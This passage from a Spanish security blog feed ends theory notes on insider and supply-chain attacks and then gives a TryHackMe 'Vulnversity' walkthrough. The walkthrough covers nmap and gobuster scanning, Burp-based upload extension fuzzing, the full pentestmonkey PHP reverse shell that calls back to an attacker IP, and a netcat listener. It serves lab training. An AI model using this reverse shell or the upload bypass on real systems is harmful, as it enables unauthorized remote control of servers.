más comunes de ataques perimetrales:</p><ul><li>Ingeniería Social (escuchas clandestinas (<strong>Eavesdropping</strong>), obtener información públicada vía internet, buscando en la basura (<strong>Dumpster diving</strong>), etc.).</li></ul><h3 id="Ataques-Internos-Insiders"><a href="#Ataques-Internos-Insiders" class="headerlink" title="Ataques Internos - Insiders"></a>Ataques Internos - Insiders</h3><p>Los ataques internos los realizan personas de confianza que tienen acceso físico a los activos críticos del objetivo (<strong>Insiders</strong>). Los insiders pueden eludir fácilmente los mecanismos de seguridad, corromper activos críticos y acceder a información confidencial debido a su acceso con privilegios. El objetivo de los insiders es afectar directamente la confidencialidad, integridad y disponibilidad de los sistemas de información. Estos ataques afectan a la reputación y las ganancias de la organización. Es bastante difícil imaginar un ataque interno, ya que se supone que todas las personas que estan contratadas tienes cierto grado de confianza con ellas.</p><p>Ejemplos de ataques internos:</p><ul><li>Eavesdropping y pinchadas telefónicas (<strong>wiretapping</strong>)</li><li>Robo de dispositivos físicos</li><li>Robo y filtración de datos</li><li>Plantar <strong>Keyloggers</strong>, backdoors o malware</li></ul><h3 id="Ataques-en-la-distribuicion"><a href="#Ataques-en-la-distribuicion" class="headerlink" title="Ataques en la distribuición"></a>Ataques en la distribuición</h3><p>Los ataques en la distribución ocurren cuando los atacantes manipulan el hardware o el software antes de la instalación. Los atacantes manipulan el hardware o software en su origen o cuando está en tránsito. Los ejemplos de ataques de distribución incluyen puertas traseras creadas por proveedores de software o hardware en el momento de la fabricación. Los atacantes aprovechan estas puertas traseras para obtener acceso no autorizado a la información, los sistemas o la red objetivo.</p><ul><li><p>Modificación de software o hardware durante la producción.</p></li><li><p>Modificación de software o hardware durante la distribución.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Apuntes</category>
      
      <category>Introducción al Ethical Hacking</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Teoría</tag>
      
      <tag>Fundamental</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnversity</title>
    <link href="/2021/11/04/vulnversity/"/>
    <url>/2021/11/04/vulnversity/</url>
    
    <content type="html"><![CDATA[<h1 id="THM-Vunlversity-Walktrhough"><a href="#THM-Vunlversity-Walktrhough" class="headerlink" title="THM - Vunlversity Walktrhough"></a>THM - Vunlversity Walktrhough</h1><h2 id="Task-2-Reconocimiento"><a href="#Task-2-Reconocimiento" class="headerlink" title="Task 2 - Reconocimiento"></a>Task 2 - Reconocimiento</h2><h3 id="1-Escanear-todos-los-puertos-TCP-abiertos-y-las-versiones"><a href="#1-Escanear-todos-los-puertos-TCP-abiertos-y-las-versiones" class="headerlink" title="1. Escanear todos los puertos TCP abiertos y las versiones:"></a>1. Escanear todos los puertos TCP abiertos y las versiones:</h3><p>La primera tarea de todas para realizar un ataque es detectar los puertos y servicios expuestos. Esta tarea se suele realizar con el comando:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV -n -p- &lt;IP&gt;<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> &lt;IP&gt;<br>Host is up (0.051s latency).<br><br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         vsftpd 3.0.3<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 5a:4f:<span class="hljs-built_in">fc</span>:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)<br>|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)<br>|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>3128/tcp open  http-proxy  Squid http proxy 3.5.12<br>|_http-server-header: squid/3.5.12<br>|_http-title: ERROR: The requested URL could not be retrieved<br>3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Vuln University<br>Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 2d16h27m17s, deviation: 2h18m34s, median: 2d15h07m17s<br>|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: vulnuniversity<br>|   NetBIOS computer name: VULNUNIVERSITY\x00<br>|   Domain name: \x00<br>|   FQDN: vulnuniversity<br>|_  System time: 2021-10-27T10:14:23-04:00<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-security-mode: <br>|   2.02: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2021-10-27T14:14:22<br>|_  start_date: N/A<br></code></pre></td></tr></table></figure><h3 id="2-Escanear-unicamente-los-puertos-TCP-abiertos-de-forma-rapida-Alternativa"><a href="#2-Escanear-unicamente-los-puertos-TCP-abiertos-de-forma-rapida-Alternativa" class="headerlink" title="2. Escanear únicamente los puertos TCP abiertos de forma rápida: (Alternativa)"></a>2. Escanear únicamente los puertos TCP abiertos de forma rápida: (Alternativa)</h3><p><strong>Script fast_scan.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">then</span><br>        ip=<span class="hljs-variable">$1</span><br>        <span class="hljs-keyword">for</span> port <span class="hljs-keyword">in</span> $(seq 1 65535); <span class="hljs-keyword">do</span><br>                timeout 1 bash -c <span class="hljs-string">&quot;echo &#x27;&#x27; &gt; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span>&quot;</span> 2&gt;/dev/null &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Port <span class="hljs-variable">$port</span> TCP is OPEN[*]&quot;</span> &amp;<br>        <span class="hljs-keyword">done</span>; <span class="hljs-built_in">wait</span><br><span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n[*] Use: ./fast_scan.sh &lt;IP&gt;\n&quot;</span><br>        <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fast_scan.sh &lt;IP&gt;<br></code></pre></td></tr></table></figure><p>Output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Port 22 is OPEN[*]<br>Port 21 is OPEN[*]<br>Port 139 is OPEN[*]<br>Port 445 is OPEN[*]<br>Port 3128 is OPEN[*]<br>Port 3333 is OPEN[*]<br></code></pre></td></tr></table></figure><h3 id="3-Solucion"><a href="#3-Solucion" class="headerlink" title="3. Solución"></a>3. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_2.png" alt="Figura 1: Solución Task 2"></p><h2 id="Task-3-Localizar-directorios-con-Gobuster"><a href="#Task-3-Localizar-directorios-con-Gobuster" class="headerlink" title="Task 3 - Localizar directorios con Gobuster"></a>Task 3 - Localizar directorios con Gobuster</h2><h3 id="1-Buscar-directorios-accesibles-mediante-fuerza-bruta"><a href="#1-Buscar-directorios-accesibles-mediante-fuerza-bruta" class="headerlink" title="1. Buscar directorios accesibles mediante fuerza bruta"></a>1. Buscar directorios accesibles mediante fuerza bruta</h3><p>Para buscar los directorios disponibles de forma automatizada, recomiendo utilizar la herramienta <strong>Gobuster</strong>.<br>Las flags que he utilizado son:</p><table><thead><tr><th><strong>Flag</strong></th><th><strong>Función</strong></th></tr></thead><tbody><tr><td><strong>dir</strong></td><td>Busca directorios</td></tr><tr><td><strong>-u</strong></td><td>Especifica una url</td></tr><tr><td><strong>-w</strong></td><td>Especifica la ruta de la wordlist para bruteforcear directorios a probar</td></tr><tr><td><strong>-t</strong></td><td>Especifica número de threads a utilizar. (contra más threads, más rápido)</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dir -u http://&lt;IP&gt;:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://&lt;IP&gt;:3333<br>[+] Method:                  GET<br>[+] Threads:                 400<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2021/12/09 17:32:24 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>/images               (Status: 301) [Size: 320] [--&gt; http://&lt;IP&gt;:3333/images/]<br>/css                  (Status: 301) [Size: 317] [--&gt; http://&lt;IP&gt;:3333/css/]   <br>/js                   (Status: 301) [Size: 316] [--&gt; http://&lt;IP&gt;:3333/js/]    <br>/fonts                (Status: 301) [Size: 319] [--&gt; http://&lt;IP&gt;:3333/fonts/] <br>/internal             (Status: 301) [Size: 322] [--&gt; http://&lt;IP&gt;:3333/internal/]<br>===============================================================<br>&lt;Date&gt; Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h3 id="2-Solucion"><a href="#2-Solucion" class="headerlink" title="2. Solución"></a>2. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_3.png" alt="Figura 2: Solución Task 3"></p><h2 id="Task-4-Comprometer-el-Webserver"><a href="#Task-4-Comprometer-el-Webserver" class="headerlink" title="Task 4 - Comprometer el Webserver"></a>Task 4 - Comprometer el Webserver</h2><h3 id="1-Comprobar-el-tipo-de-ficheros-permitidos-para-el-Upload"><a href="#1-Comprobar-el-tipo-de-ficheros-permitidos-para-el-Upload" class="headerlink" title="1. Comprobar el tipo de ficheros permitidos para el Upload"></a>1. Comprobar el tipo de ficheros permitidos para el Upload</h3><p>Una vez accedemos al webserver <a href="http://ip:3333/internal">http://IP:3333/internal</a>, cargamos una web que permite al usuario subir ficheros al sistema.<br>Cuando el usuario busca conectarse al sistema via un Reverse Shell via web, lo más habitual es subir ficheros del tipo PHP o similares.</p><h4 id="1-Crear-la-lista-de-extensiones"><a href="#1-Crear-la-lista-de-extensiones" class="headerlink" title="1. Crear la lista de extensiones"></a>1. Crear la lista de extensiones</h4><p>Para comprobar de una forma eficaz que tipo de extensiones son válidas, se recomienda el uso de la herramienta <strong>Burpsuite</strong>.<br>He creado una fichero llamado “ext_check.txt”, el cuál contiene la lista de extensiones que quiero comprobar de forma automatizada.</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">cat ext_check.txt <br>php<br>php3<br>php4<br>php5<br>phtml<br></code></pre></td></tr></table></figure><h4 id="2-Interceptar-la-peticion-y-automatizar-la-comprobacion"><a href="#2-Interceptar-la-peticion-y-automatizar-la-comprobacion" class="headerlink" title="2. Interceptar la petición y automatizar la comprobación"></a>2. Interceptar la petición y automatizar la comprobación</h4><p>Una vez tengamos la lista creada, toca utilizar la herramienta <strong>Burpsuite</strong> y interceptar la petición que realiza el usuario cuando selecciona un fichero y le da al botón de <strong>Submit</strong>.</p><p>En el apartado de <strong>Intercept</strong>, nos deberá aparecer un código similar al de la siguiente imagen. El proximo paso es enviar esta petición al modo <strong>Intruder</strong> para poder seleccionar los campos de interes y poder iterar sobre ellos.<br><img src="/img/Walkthrough/THM/Vulnversity/burpsuite.png" alt="Figura 3: Modo Intercept"></p><p>En el apartado <strong>Positions</strong> debemos verificar que ejecutemos el ataque de tipo <strong>Sniper</strong> y marcar unicamente esos carácteres concretos con el botón lateral “Add §”.<br><img src="/img/Walkthrough/THM/Vulnversity/sniper.png" alt="Figura 4: Sniper Attack"></p><p>Finalmente, en el apartado <strong>Payloads</strong>, deberemos subir el fichero creado previamente con las extensiones.<br><img src="/img/Walkthrough/THM/Vulnversity/ext_list.png" alt="Figura 5: Cargar el fichero ext_check.txt"></p><p>Una vez realizado estos 3 pasos, podemos proceder a realizar el ataque. Esto nos devolverá un resultado similar a este:<br><img src="/img/Walkthrough/THM/Vulnversity/results.png" alt="Figura 6: Resultados del Sniper Attack"></p><p>De esta forma, vemos que la extension <strong>phtml</strong> tiene un lenght code diferente al resto. Esto significa que el resultado para esa extensión difiere de un resultado no valido “Lenght 737”.</p><h3 id="2-Subir-una-Reverse-Shell-y-establecer-comunicacion"><a href="#2-Subir-una-Reverse-Shell-y-establecer-comunicacion" class="headerlink" title="2. Subir una Reverse Shell y establecer comunicación"></a>2. Subir una Reverse Shell y establecer comunicación</h3><p>Una <strong>Reverse Shell</strong> es la forma más habitual la cuál los hackers acceden a un sistema de forma remota. Para ello, hay que buscar una forma de obligar al Host Remoto a establecer una conexión con el Host a la escucha (este equipo es el del atacante).</p><p>Para crear <strong>Reverse Shells</strong> de forma sencilla, existe <a href="https://www.revshells.com/">https://www.revshells.com</a>, que nos permite crear el código de dicha shell de forma automática únicamente especificando la IP del Host y el Puerto que va a estar escuchando en nuestro equipo.<br>Cuando se trata de ejecutar una <strong>Reverse Shell</strong> en lenguaje PHP, se suele utilizar <strong>PHP PentestMonkey</strong>.</p><h4 id="1-Crear-el-fichero-revshell-phtml"><a href="#1-Crear-el-fichero-revshell-phtml" class="headerlink" title="1. Crear el fichero revshell.phtml"></a>1. Crear el fichero revshell.phtml</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat revshell.phtml <br>&lt;?php<br>// php-reverse-shell - A Reverse Shell implementation <span class="hljs-keyword">in</span> PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php<br>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net<br><br>set_time_limit (0);<br><span class="hljs-variable">$VERSION</span> = <span class="hljs-string">&quot;1.0&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&lt;IP&gt;&#x27;</span>;<br><span class="hljs-variable">$port</span> = 1234;<br><span class="hljs-variable">$chunk_size</span> = 1400;<br><span class="hljs-variable">$write_a</span> = null;<br><span class="hljs-variable">$error_a</span> = null;<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&#x27;uname -a; w; id; sh -i&#x27;</span>;<br><span class="hljs-variable">$daemon</span> = 0;<br><span class="hljs-variable">$debug</span> = 0;<br><br><span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">&#x27;pcntl_fork&#x27;</span>)) &#123;<br><span class="hljs-variable">$pid</span> = pcntl_fork();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span> == -1) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t fork&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$pid</span>) &#123;<br><span class="hljs-built_in">exit</span>(0);  // Parent exits<br>&#125;<br><span class="hljs-keyword">if</span> (posix_setsid() == -1) &#123;<br>printit(<span class="hljs-string">&quot;Error: Can&#x27;t setsid()&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-variable">$daemon</span> = 1;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>printit(<span class="hljs-string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">chdir</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><br><span class="hljs-built_in">umask</span>(0);<br><br>// Open reverse connection<br><span class="hljs-variable">$sock</span> = fsockopen(<span class="hljs-variable">$ip</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$sock</span>) &#123;<br>printit(<span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (<span class="hljs-variable">$errno</span>)&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>   0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),  // stdin is a pipe that the child will <span class="hljs-built_in">read</span> from<br>   1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),  // stdout is a pipe that the child will write to<br>   2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)   // stderr is a pipe that the child will write to<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-variable">$shell</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (!is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);<br><span class="hljs-built_in">exit</span>(1);<br>&#125;<br><br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[0], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[1], 0);<br>stream_set_blocking(<span class="hljs-variable">$pipes</span>[2], 0);<br>stream_set_blocking(<span class="hljs-variable">$sock</span>, 0);<br><br>printit(<span class="hljs-string">&quot;Successfully opened reverse shell to <span class="hljs-variable">$ip</span>:<span class="hljs-variable">$port</span>&quot;</span>);<br><br><span class="hljs-keyword">while</span> (1) &#123;<br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$sock</span>)) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell connection terminated&quot;</span>);<br><span class="hljs-built_in">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (feof(<span class="hljs-variable">$pipes</span>[1])) &#123;<br>printit(<span class="hljs-string">&quot;ERROR: Shell process terminated&quot;</span>);<br><span class="hljs-built_in">break</span>;<br>&#125;<br><br><span class="hljs-variable">$read_a</span> = array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$pipes</span>[2]);<br><span class="hljs-variable">$num_changed_sockets</span> = stream_select(<span class="hljs-variable">$read_a</span>, <span class="hljs-variable">$write_a</span>, <span class="hljs-variable">$error_a</span>, null);<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;SOCK: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$pipes</span>[0], <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[1], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDOUT: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$read_a</span>)) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR READ&quot;</span>);<br><span class="hljs-variable">$input</span> = fread(<span class="hljs-variable">$pipes</span>[2], <span class="hljs-variable">$chunk_size</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$debug</span>) printit(<span class="hljs-string">&quot;STDERR: <span class="hljs-variable">$input</span>&quot;</span>);<br>fwrite(<span class="hljs-variable">$sock</span>, <span class="hljs-variable">$input</span>);<br>&#125;<br>&#125;<br><br>fclose(<span class="hljs-variable">$sock</span>);<br>fclose(<span class="hljs-variable">$pipes</span>[0]);<br>fclose(<span class="hljs-variable">$pipes</span>[1]);<br>fclose(<span class="hljs-variable">$pipes</span>[2]);<br>proc_close(<span class="hljs-variable">$process</span>);<br><br><span class="hljs-keyword">function</span> printit (<span class="hljs-variable">$string</span>) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$daemon</span>) &#123;<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;<span class="hljs-variable">$string</span>\n&quot;</span>;<br>&#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="2-Buscar-directorio-donde-se-almacenan-los-Uploaded-Files"><a href="#2-Buscar-directorio-donde-se-almacenan-los-Uploaded-Files" class="headerlink" title="2. Buscar directorio donde se almacenan los Uploaded Files"></a>2. Buscar directorio donde se almacenan los Uploaded Files</h4><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dir -u http://&lt;IP&gt;:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 400<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://&lt;IP&gt;:3333/internal<br>[+] Method:                  GET<br>[+] Threads:                 400<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2021/12/09 17:45:48 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br><br>/uploads             (Status: 301) [Size: 322] [--&gt; http://&lt;IP&gt;:3333/uploads/]<br>===============================================================<br>&lt;Date&gt; Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h4 id="3-Ejecutar-el-Listenner-en-nuestro-equipo"><a href="#3-Ejecutar-el-Listenner-en-nuestro-equipo" class="headerlink" title="3. Ejecutar el Listenner en nuestro equipo"></a>3. Ejecutar el Listenner en nuestro equipo</h4><p>Deberemos poner nuestro equipo a la escucha. De esa forma, cuando un usuario abra el fichero <strong>revshell.phtml</strong> esto establecerá la conexión y nos permitirá tener control del equipo desde la shell.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lnvp 1234<br></code></pre></td></tr></table></figure><h4 id="4-Establecer-conexion"><a href="#4-Establecer-conexion" class="headerlink" title="4. Establecer conexión"></a>4. Establecer conexión</h4><p>Una vez accedemos a la ruta: <a href="http://ip:3333/internal/uploads/revshell.phtml">http://IP:3333/internal/uploads/revshell.phtml</a>, en nuestra ventana del terminal nos aparecerá que hemos establecido conexión con el equipo remoto y podemos navegar por todo el sistema.<br><img src="/img/Walkthrough/THM/Vulnversity/web_root.png" alt="Figura 7: http://&lt;IP&gt;:3333/internal/uploads/"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ nc -lvnp 1234                                                      127 ⨯<br>listening on [any] 